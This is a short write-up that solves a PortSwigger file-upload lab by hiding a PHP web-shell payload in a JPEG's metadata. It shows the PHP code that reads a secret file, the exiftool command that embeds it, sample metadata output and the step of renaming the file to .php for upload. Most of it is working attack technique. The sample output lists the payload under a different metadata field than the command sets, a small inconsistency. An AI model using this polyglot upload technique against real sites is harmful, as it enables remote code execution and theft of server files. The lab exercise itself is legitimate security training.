# Polyglot Payload PHP/JPEG

This polyglot payload is meant to solve the following PortSwigger lab:

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

Original Image Before Tampering:

![Orignal Photo Of Pug](./payload-in-metadata-original.jpg "Cute pug wrapped in a blanket")

PHP Payload:

```php
<?php
    echo 'hereiam ' . file_get_contents('/home/carlos/secret') . ' hereiam';
?>
```

Exiftool Command For Placing Payload In JPEG:

```
$ exiftool -DocumentID="<?php echo 'hereiam ' . file_get_contents('/home/carlos/secret') . ' hereiam' ;?>" payload-in-metadata.jpg
```

Example Output Of Metadata After Comment Added:

```
$ exiftool payload-in-metadata.jpg

File Name                       : payload-in-metadata.jpg
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Comment                         : <?php echo 'hereiam ' . file_get_contents('/home/carlos/secret') . ' hereiam';?>
Image Width                     : 640
Image Height                    : 426
```

Image After Payload Added:

![Image After PHP Payload Inserted](./payload-in-metadata.jpg "Pug Wrapped In Blanket, Payload Hidden In Metadata")

Image After Changing Extension To PHP:

[Image Ready For Upload](./payload-in-metadata.php "PHP Program Hidden In JPEG")
